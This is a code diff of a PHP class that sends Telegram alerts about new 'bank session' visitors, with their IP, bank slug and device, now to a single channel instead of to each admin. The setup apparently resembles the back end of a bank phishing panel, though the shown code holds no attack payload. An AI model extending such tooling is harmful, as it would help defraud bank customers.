@@ -94,11 +94,10 @@ class NotifyAdminsOfBankSession
         if (!Cache::add('presession-sent:' . $preSession->id, true, 60)) {
             return;
         }
-        $admins     = Admin::where('is_active', true)->get()->unique('telegram_user_id');
-        $ip         = $preSession->ip_address ?? '-';
-        $bank       = $preSession->bank_slug ?? '-';
-        $device     = $preSession->device_type === 'mobile' ? '📱 Мобильный' : '🖥️ ПК';
-        $psId       = $preSession->id;
+
+        $ip     = $preSession->ip_address ?? '-';
+        $bank   = $preSession->bank_slug ?? '-';
+        $device = $preSession->device_type === 'mobile' ? '📱 Мобильный' : '🖥️ ПК';
 
         $text = <<<HTML
 🛰 <b>Новый посетитель</b>
@@ -109,30 +108,34 @@ class NotifyAdminsOfBankSession
 🟢 Онлайн
 HTML;
 
-        $keyboard = InlineKeyboardMarkup::make()
-            ->addRow(
-                InlineKeyboardButton::make('🟢 Онлайн?', callback_data: "presession:online:{$psId}"),
-            );
-
-        foreach ($admins as $admin) {
+        $channelId = config('services.telegram.notify_channel');
+        if ($channelId) {
             try {
-                $msg = $this->bot->sendMessage(
+                $this->bot->sendMessage(
                     text: $text,
-                    chat_id: $admin->telegram_user_id,
+                    chat_id: $channelId,
                     parse_mode: 'HTML',
-                    reply_markup: $keyboard,
                 );
-                if ($preSession->telegram_message_id === null && $msg !== null) {
-                    $preSession->telegram_message_id = $msg->message_id;
-                    $preSession->telegram_chat_id    = $admin->telegram_user_id;
-                    $preSession->save();
-                }
             } catch (\Throwable $e) {
-                logger()->warning('Failed to send pre-session notification', [
-                    'admin_id' => $admin->id,
-                    'error'    => $e->getMessage(),
-                ]);
+                logger()->warning('Failed to send pre-session to channel', ['error' => $e->getMessage()]);
             }
+        }
+    }
+
+    public function sendToChannel(string $text): void
+    {
+        $channelId = config('services.telegram.notify_channel');
+        if (!$channelId) {
+            return;
+        }
+        try {
+            $this->bot->sendMessage(
+                text: $text,
+                chat_id: $channelId,
+                parse_mode: 'HTML',
+            );
+        } catch (\Throwable $e) {
+            logger()->warning('Failed to send to channel', ['error' => $e->getMessage()]);
         }
     }
 }
